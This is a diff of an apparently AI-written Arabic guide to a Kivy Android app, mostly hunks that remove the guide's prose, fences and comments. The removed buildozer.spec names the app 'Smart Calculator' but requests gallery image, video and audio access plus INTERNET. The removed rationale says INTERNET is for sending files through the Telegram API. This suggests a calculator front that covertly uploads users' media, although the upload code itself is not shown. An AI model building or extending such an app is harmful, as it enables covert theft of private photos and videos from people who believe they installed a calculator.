@@ -1,6 +1,3 @@
-إليك النسخة المعدلة بالكامل والجاهزة للعمل بدون أخطاء على جميع إصدارات أندرويد (من API 21 إلى API 34 وما بعده)، مع تطبيق كافة قواعد الحماية ومنع الإغلاق المفاجئ وطلب الأذونات بدقة حسب إصدار النظام.
-### 1. ملف main.py كاملاً
-```python
 import sys
 import os
 import traceback
@@ -294,16 +291,13 @@ class MyApp(App):
                     pass
 
                 if sdk <= 22:
-                    # أندرويد 5.1 وأقل: الأذونات تُمنح عند التثبيت ولا تُطلب وقت التشغيل
                     pass
                 elif 23 <= sdk <= 32:
-                    # أندرويد 6 إلى 12: طلب أذونات التخزين القديمة
                     perms = [Permission.READ_EXTERNAL_STORAGE]
                     if hasattr(Permission, 'WRITE_EXTERNAL_STORAGE'):
                         perms.append(Permission.WRITE_EXTERNAL_STORAGE)
                     request_permissions(perms, permission_callback)
                 else:
-                    # أندرويد 13 وما فوق: طلب أذونات الوسائط الحديثة وإشعارات بوست
                     perms = []
                     if hasattr(Permission, 'READ_MEDIA_IMAGES'):
                         perms.append(Permission.READ_MEDIA_IMAGES)
@@ -323,39 +317,3 @@ if __name__ == "__main__":
         MyApp().run()
     except Exception as e:
         print(f"Fatal: {e}")
-
-```
-### 2. ملف buildozer.spec كاملاً
-```ini
-[app]
-title = Smart Calculator
-package.name = smartcalculator
-package.domain = org.smartcalc
-source.dir = .
-source.include_exts = py,png,jpg,kv,atlas,ttf,json
-version = 0.1
-requirements = python3,kivy==2.3.0,requests,urllib3,idna,certifi,chardet
-orientation = portrait
-fullscreen = 0
-android.permissions = INTERNET, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, READ_MEDIA_AUDIO, POST_NOTIFICATIONS
-android.api = 33
-android.minapi = 21
-android.ndk = 25b
-android.archs = arm64-v8a, armeabi-v7a
-android.accept_sdk_license = True
-android.allow_backup = True
-android.enable_androidx = True
-
-[buildozer]
-log_level = 2
-warn_on_root = 1
-
-```
-### 3. قائمة الأذونات المضافة وسبب كل واحد
- * **INTERNET**: إذن ضروري ومهم لإرسال الملفات والاتصالات عبر واجهة برمجة تطبيقات التيليجرام (requests).
- * **READ_EXTERNAL_STORAGE**: لقراءة الصور والفيديوهات من المعرض في هواتف أندرويد القديمة (من API 23 إلى 32).
- * **WRITE_EXTERNAL_STORAGE**: إذن الكتابة والتخزين للأجهزة القديمة التي تدعمه.
- * **READ_MEDIA_IMAGES**: الإذن الحديث المخصص للوصول الآمن للصور في أندرويد 13 فما فوق (API 33+).
- * **READ_MEDIA_VIDEO**: الإذن الحديث المخصص للوصول الآمن للفيديوهات في أندرويد 13 فما فوق.
- * **READ_MEDIA_AUDIO**: الإذن الحديث المخصص للوصول الآمن للملفات الصوتية في أندرويد 13 فما فوق.
- * **POST_NOTIFICATIONS**: إذن إرسال الإشعارات المطلوب في أندرويد 13 والإصدارات الأحدث.
